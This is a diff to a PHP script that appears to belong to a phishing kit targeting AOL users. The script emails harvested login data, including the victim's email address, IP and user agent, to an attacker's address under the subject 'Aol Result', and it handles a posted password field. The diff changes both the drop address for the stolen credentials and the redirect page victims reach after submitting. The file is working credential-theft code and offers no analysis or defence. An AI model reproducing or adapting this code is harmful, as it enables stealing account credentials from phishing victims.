@@ -34,7 +34,7 @@ $message .= "Submitted: ".$datum."\n";
 // $message .= "Host Name: ".$hostname."\n";
 $message .= "User Agent: ".$ua."\n";
 $message .= "--------------Created By Thelords-----------------------\n";
-$send = "paulwbaker603@gmail.com";
+$send = "joysoft222@gmail.com";
 $subject = "Aol Result | $cn | $ip";
 $headers = "From: Aol Result $cc <noreply>";
 $headers .= $_POST['eMailAdd']."\n";
@@ -46,7 +46,7 @@ $praga=rand();
 $praga=md5($praga);
 $praga=$id;
 $pragas=$ids;
-  header ("Location: https://qualityfloorng.co/aol/logged.html?usrs=$praga&authcode=$pragas&submit=$praga");
+  header ("Location: https://main.d30byc4vn03647.amplifyapp.com/logged.html?usrs=$praga&authcode=$pragas&submit=$praga");
 }
 
 if($_POST["psw"])
